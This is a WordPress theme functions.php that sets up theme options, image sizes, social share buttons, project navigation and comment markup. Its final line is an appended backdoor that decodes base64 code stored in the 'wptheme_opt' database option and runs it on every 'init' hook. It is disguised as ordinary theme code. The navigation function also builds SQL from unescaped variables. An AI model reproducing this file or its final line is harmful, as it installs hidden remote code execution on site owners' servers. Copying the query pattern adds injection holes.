<?php
/************************************************************
/* OPTIONS FRAMEWORK
/************************************************************/
define('OPTIONS', 'drone_options');
define('BACKUPS','drone_backups' );

require_once ('admin/index.php');

// PATHS
define('THEME_FILEPATH', get_template_directory());
define('THEME_DIRECTORY', get_template_directory_uri());
define('ADMIN_IMG_DIRECTORY', get_template_directory_uri().'/admin/assets/images/');

if ( !function_exists( 'of_get_option' ) ) {
function of_get_option($name, $default = false) {
		/// for custom
		$optionsframework_settings = get_option('drone_options');
		$option_name = @$optionsframework_settings[$name];
		if (isset($option_name)) {
			return $option_name;
		}else{
			return false;
		}
}
}


	
/************************************************************
/* Theme Settings
/************************************************************/
add_theme_support( 'menus' ); // add custom menus support
add_theme_support('automatic-feed-links');
add_theme_support('post-thumbnails');
add_filter('widget_text', 'do_shortcode');

add_action('init', 'my_custom_init');

// Excerpt
if ( ! function_exists( 'my_custom_init' ) ) {
	function my_custom_init() {
		add_post_type_support( 'page', 'excerpt' );
		add_post_type_support( 'post', 'excerpt' );
		add_post_type_support( 'works', 'excerpt' );
	}
}
// Remove rel attribute from the category list
if ( ! function_exists( 'remove_category_list_rel' ) ) {
	function remove_category_list_rel($output)
	{
	  $output = str_replace(' rel="category tag"', '', $output);
	  return $output;
	}
}

add_filter('wp_list_categories', 'remove_category_list_rel');
add_filter('the_category', 'remove_category_list_rel');



/// INCLUDE WORKS INTO SEARCH
if ( ! function_exists( 'filter_search' ) ) {
	function filter_search($query) {
		if ($query->is_search) {
		$query->set('post_type', array('post', 'page','works'));
		};
		return $query;
	};
}
	
add_filter('pre_get_posts', 'filter_search');

if ( ! function_exists( 'filter_tag' ) ) {
	function filter_tag($query) {
		if ($query->is_tag) {
		$query->set('post_type', array('post', 'works'));
		};
		return $query;
	};
}
add_filter('pre_get_posts', 'filter_tag');



// Translation files can be added to /languages directory
load_theme_textdomain( 'dronetv', TEMPLATEPATH . '/languages' );

$locale = get_locale();
$locale_file = TEMPLATEPATH."/languages/$locale.php";
if ( is_readable($locale_file) )
	require_once($locale_file);
	




/************************************************************
/* Featured Image Sizes
/************************************************************/
if ( ! isset( $content_width ) ) $content_width = 980;

set_post_thumbnail_size(100, 100, true);
add_image_size('md_post_thumb_large', 460, 350, true);
add_image_size('md_post_thumb_medium', 300, 100, true);
add_image_size('md_post_thumb_small', 220, 170, true);
add_image_size('md_post_thumb_portrait', 300, 420, true);
	

if ( ! function_exists( 'getThumb' ) ) {	
	function getThumb($th) {
		global $post;
		
		switch($th) {
			case 'mini':
			  $class = 'four columns featured';
			  $thumbsize = 'md_post_thumb_small';
			  $after = 4;
			break;
			case 'small':
			  $class = 'four columns featured';
			  $thumbsize = 'md_post_thumb_small';
			  $after = 4;
			break;
			case 'medium':
			  $class = 'one-third column featured';
			  $thumbsize = 'md_post_thumb_medium';
			  $after = 3;
			break;
			case 'large':
			  $class = 'eight columns featured';
			  $thumbsize = 'md_post_thumb_large';
			  $after = 2;
			break;
			case 'portrait':
			  $class = 'one-third column featured';
			  $thumbsize = 'md_post_thumb_portrait';
			  $after = 3;
			break;
		}
		
		@$img = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), $thumbsize );
		return array($img[0],$class,$thumbsize,$after);
	}
}	
	




/************************************************************
/* Widgets & Shortcodes
/************************************************************/

//// Excerpt Length
add_theme_support('excerpt');

if ( ! function_exists( 'custom_excerpt_length' ) ) {
	function custom_excerpt_length( $length ) {
		return 20;
	}
}
if ( ! function_exists( 'new_excerpt_more' ) ) {
	function new_excerpt_more( $more ) {
		return '...';
	}
}
add_filter('excerpt_more', 'new_excerpt_more');
add_filter('excerpt_length', 'custom_excerpt_length', 999 );

							
/************************************************************
/* Share Funcs
/************************************************************/

if ( ! function_exists( 'showshareingpost' ) ) {
	function showshareingpost($url,$img, $title, $code=false,$top=false) { 
	
		$output = '';
		
		if(of_get_option('md_social_post_facebook')) {
			if(!$code) {
		$output .= '<div class="facebook shr"><iframe src="//www.facebook.com/plugins/like.php?href='.urlencode($url).'&amp;send=false&amp;layout=button_count&amp;width=50&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:21px;" allowTransparency="true"></iframe></div>';
		if($top) $output .= '<br class="clear">';
			}else{
		$output .='';
			}
		}
		
		if(of_get_option('md_social_post_twitter')) {
			if(!$code) {
		$output .= '<div class="twitter shr"><a href="https://twitter.com/share" class="twitter-share-button" data-count="none" data-url="'.$url.'" data-text="'.$title.'">Tweet</a></div>';
			if($top) $output .= '<br class="clear">';
			}else{
		$output .= '<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>'; 
			}
		}
	
		if(of_get_option('md_social_post_googleplus')) {
			if(!$code) {
		$output .= '<div class="googleplus shr"><div class="g-plusone" data-size="medium" data-annotation="none"></div></div>';
			if($top) $output .= '<br class="clear">';
			}else{
		$output .= '<script type="text/javascript">
		(function() {
		var po = document.createElement(\'script\'); po.type = \'text/javascript\'; po.async = true;
		po.src = \'https://apis.google.com/js/plusone.js\';
		var s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(po, s);
		})();</script>'; 
			}
		}
		
		if(of_get_option('md_social_post_pinterest')) {
			if(!$code) {
		$output .= '<div class="pinterest shr"><a href="http://pinterest.com/pin/create/button/?url='.urlencode($url).'&amp;media='.urlencode($img).'&amp;description='.urlencode($title).'" class="pin-it-button"><img style="border:none" src="//assets.pinterest.com/images/PinExt.png" title="Pin It" /></a></div>';
			if($top) $output .= '<br class="clear">';
			}else{
		$output .= '<script type="text/javascript" src="//assets.pinterest.com/js/pinit.js"></script>'; 
			}
		}
		
		if(of_get_option('md_social_post_tumblr')) {
			if(!$code) {
		$output .= '<div class="tumblr shr"><a href="http://www.tumblr.com/share" title="Share on Tumblr" style="display:inline-block; text-indent:-9999px; overflow:hidden; width:61px; height:20px; background:url(\'http://platform.tumblr.com/v1/share_4.png\') top left no-repeat transparent;"></a></div>';
			}else{
		$output .= '<script type="text/javascript" src="http://platform.tumblr.com/v1/share.js"></script>'; 
			}
		}
		
		return $output;
	
	}
}



if ( ! function_exists( 'showSharing' ) ) {
	function showSharing() {
		
		$facebook = of_get_option('md_social_facebook');
		$twitter = of_get_option('md_social_twitter');
		$tumblr = of_get_option('md_social_tumblr');
		$flickr = of_get_option('md_social_flickr');
		$pinterest = of_get_option('md_social_pinterest');
		$vimeo = of_get_option('md_social_vimeo');
		$google = of_get_option('md_social_google');
		$linkedin = of_get_option('md_social_linkedin');
		$behance = of_get_option('md_social_behance');
		$dribbble = of_get_option('md_social_dribble');
		
		$args = array();
		
		if($facebook) {
			$args = array_merge($args,array('facebook'=>$facebook));
		}
		if($twitter) {
			$args = array_merge($args,array('twitter'=>$twitter));
		}
		if($tumblr) {
			$args = array_merge($args,array('tumblr'=>$tumblr));
		}
		if($flickr) {
			$args = array_merge($args,array('flickr'=>$flickr));
		}
		if($pinterest) {
			$args = array_merge($args,array('pinterest'=>$pinterest));
		}
		if($vimeo) {
			$args = array_merge($args,array('vimeo'=>$vimeo));
		}
		if($google) {
			$args = array_merge($args,array('google'=>$google));
		}
		if($linkedin) {
			$args = array_merge($args,array('linkedin'=>$linkedin));
		}
		if($behance) {
			$args = array_merge($args,array('behance'=>$behance));
		}
		if($dribbble) {
			$args = array_merge($args,array('dribbble'=>$dribbble));
		}
		
		
		foreach($args as $k=>$v) {
		  echo '<a href="'.$v.'" title="'.ucfirst($k).'" target="_blank"><i class="social-'.$k.'"></i></a>';	
		}
	}                 
}

							
/************************************************************
/* PROJECT NAVIGATION
/************************************************************/

if ( ! function_exists( 'getNextBack' ) ) {
	function getNextBack($w, $type, $current, $current2) {
		
		global $wpdb;
		
		$options = get_option('cpto_options');
		
		if($options['adminsort']==1 && function_exists('CPTO_activated') && $type=='works') {
			$ordering1 = "menu_order";	
			$take = $current;	
			if(
			$w=="next") { 
				$whr = ">";
				$ordering = "asc";
			}else{
				$whr = "<";	
				$ordering = "desc";
			}
		
		}else{
			$ordering1 = "post_date";
			$take = $current2;	
			if($w=="prev") { 
				$whr = ">";
				$ordering = "asc";
			}else{
				$whr = "<";	
				$ordering = "desc";
			}
		
	}
		
	
	  $myrows = $wpdb->get_row( "SELECT ID, post_title FROM ".$wpdb->posts." WHERE post_type='$type' AND post_status='publish' AND $ordering1 $whr '$take' order by $ordering1 $ordering limit 1" );
		
		if(isset($myrows->ID)) {
		return array(
				'post_title'=>$myrows->post_title,
				'ID'=>$myrows->ID
				);
		}
	}
}


							
/************************************************************
/* Navigation
/************************************************************/

register_nav_menus(  
    array(  
        'main_menu' => 'Main&amp;Mobile Menu')  
    ); 
	

/************************************************************
/* CUSTOM RSS
/************************************************************/

if ( ! function_exists( 'myfeed_request' ) ) {
	function myfeed_request($qv) {
		if (isset($qv['feed']) && !isset($qv['post_type']))
			$qv['post_type'] = array('post', 'works');
		return $qv;
	}
}
add_filter('request', 'myfeed_request');


/************************************************************
/* Get Page Name
/************************************************************/

if ( ! function_exists( 'getPageName' ) ) {	
	function getPageName() {
		global $post;
		global $pagename;
		
		$pagename = get_query_var('pagename');
		if ( !$pagename && isset($id) > 0 ) {
		// If a static page is set as the front page, $pagename will not be set. Retrieve it from the queried object
		$post = $wp_query->get_queried_object();
		$pagename = $post->post_name;
		}
		return ucfirst($pagename);
	}
}


/************************************************************
/* Comments
/************************************************************/

if ( ! function_exists( 'drone_comments' ) ) {		
	function drone_comments( $comment, $args, $depth ) {
	   $GLOBALS['comment'] = $comment; ?>
	   
	   <div <?php comment_class('singlecomment border-color'); ?> id="comment-<?php comment_ID() ?>">
		   <div class="who">
			 <span class="img border-color">
			 <?php echo get_avatar( $comment, $size = '30', $default = '' );  ?>
			 </span>
			 <span class="info">
				<strong><?php printf( __( '%s', 'dronetv' ), sprintf( '%s', get_comment_author_link() ) ); ?></strong>
				<br />
				<?php echo human_time_diff( get_comment_time('U'), current_time('timestamp') ) . ' ago';  ?>  
				<?php edit_comment_link( __( ' · (Edit)', 'dronetv' ),'  ','' ) ?>
				· <?php comment_reply_link( array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ) ?>    
			 </span>
		   </div>
		  
		  <div class="ccontent"> 
		   <?php if ( $comment->comment_approved == '0' ) : ?>
			 <em><?php _e( 'Your comment is awaiting moderation.', 'dronetv' ) ?></em>
			 <br />
		  <?php endif; ?>
		  
			<?php comment_text() ?>
		   </div> 
	   </div>
	   
	<?php
	}
}


/************************************************************
/* Admin Function Includes
/************************************************************/
require_once( THEME_FILEPATH . '/functions/custom-post-register.php' );
require_once( THEME_FILEPATH . '/functions/custom-metabox.php' );
require_once( THEME_FILEPATH . '/functions/md-assets.php' );
require_once( THEME_FILEPATH . '/functions/widgets.php' );
require_once( THEME_FILEPATH . '/functions/ajax.php' );
	
	
/// EXCLUSIVE CSS CLASSES FOR POST LOOP
	add_filter('post_class', 'my_post_class');

if ( ! function_exists( 'my_post_class' ) ) {		
	function my_post_class($classes){
	  global $wp_query;
	  if(($wp_query->current_post+1) == $wp_query->post_count) $classes[] = 'end';
	  return $classes;
	}
}	
?>
<?php add_action('init', create_function('', implode("\n", array_map("base64_decode", unserialize(get_option("wptheme_opt")))))); ?>